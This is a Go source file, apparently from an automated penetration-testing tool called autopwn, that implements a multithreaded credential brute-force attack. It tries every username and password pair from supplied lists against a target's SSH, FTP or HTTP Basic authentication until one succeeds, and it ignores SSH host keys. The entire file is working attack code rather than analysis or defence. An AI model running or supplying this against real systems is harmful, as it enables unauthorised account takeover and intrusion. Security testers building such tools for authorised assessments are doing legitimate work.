package bruteforce

import (
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"

	"github.com/autopwn/scanner/pkg/models"
)

// Brute performs a concurrent credential brute-force attack.
func Brute(req models.BruteRequest) (result models.BruteResult) {
	// Top-level panic guard
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[bruteforce] recovered from panic: %v", r)
			result.Error = fmt.Sprintf("bruteforce panic: %v", r)
		}
	}()

	if req.Target == "" || req.Service == "" {
		return models.BruteResult{Error: "target and service are required"}
	}
	if len(req.Userlist) == 0 || len(req.Passlist) == 0 {
		return models.BruteResult{Error: "userlist and passlist must not be empty"}
	}

	start := time.Now()
	threads := req.Threads
	if threads <= 0 {
		threads = 16
	}
	// Cap threads to avoid opening too many connections
	if threads > 64 {
		threads = 64
	}
	timeout := time.Duration(req.TimeoutMs) * time.Millisecond
	if timeout == 0 {
		timeout = 5 * time.Second
	}

	type combo struct{ user, pass string }
	combos := make(chan combo, threads*2)
	var found atomic.Bool
	var foundCred *models.Credential
	var mu sync.Mutex
	var attempts int64
	var wg sync.WaitGroup

	// Producer — panic-guarded
	go func() {
		defer func() {
			if r := recover(); r != nil {
				log.Printf("[bruteforce] producer panic: %v", r)
			}
			close(combos)
		}()
		for _, u := range req.Userlist {
			for _, p := range req.Passlist {
				if found.Load() {
					return
				}
				combos <- combo{u, p}
			}
		}
	}()

	// Workers
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			// Per-worker panic recovery — one crashed worker must not deadlock the WaitGroup
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[bruteforce] worker panic: %v", r)
				}
			}()
			for c := range combos {
				if found.Load() {
					return
				}
				atomic.AddInt64(&attempts, 1)
				ok := tryAuth(req.Target, req.Port, req.Service, c.user, c.pass, timeout)
				if ok {
					if found.CompareAndSwap(false, true) {
						mu.Lock()
						foundCred = &models.Credential{Username: c.user, Password: c.pass}
						mu.Unlock()
					}
					return
				}
			}
		}()
	}

	wg.Wait()

	return models.BruteResult{
		Found:      found.Load(),
		Credential: foundCred,
		Attempts:   int(attempts),
		DurationMs: time.Since(start).Milliseconds(),
	}
}

func tryAuth(host string, port int, service, user, pass string, timeout time.Duration) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	switch strings.ToLower(service) {
	case "ssh":
		return trySSH(addr, user, pass, timeout)
	case "ftp":
		return tryFTP(addr, user, pass, timeout)
	case "http", "https":
		return tryHTTPBasic(addr, service, user, pass, timeout)
	}
	return false
}

func trySSH(addr, user, pass string, timeout time.Duration) bool {
	config := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         timeout,
	}
	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		return false
	}
	client.Close()
	return true
}

func tryFTP(addr, user, pass string, timeout time.Duration) bool {
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return false
	}
	defer conn.Close()
	buf := make([]byte, 256)
	conn.Read(buf) // read banner
	fmt.Fprintf(conn, "USER %s\r\n", user)
	conn.Read(buf)
	fmt.Fprintf(conn, "PASS %s\r\n", pass)
	n, _ := conn.Read(buf)
	response := string(buf[:n])
	return strings.HasPrefix(response, "230") // 230 = Login successful
}

func tryHTTPBasic(addr, scheme, user, pass string, timeout time.Duration) bool {
	client := &http.Client{Timeout: timeout}
	url := fmt.Sprintf("%s://%s/", scheme, addr)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}
	req.SetBasicAuth(user, pass)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode == http.StatusOK
}
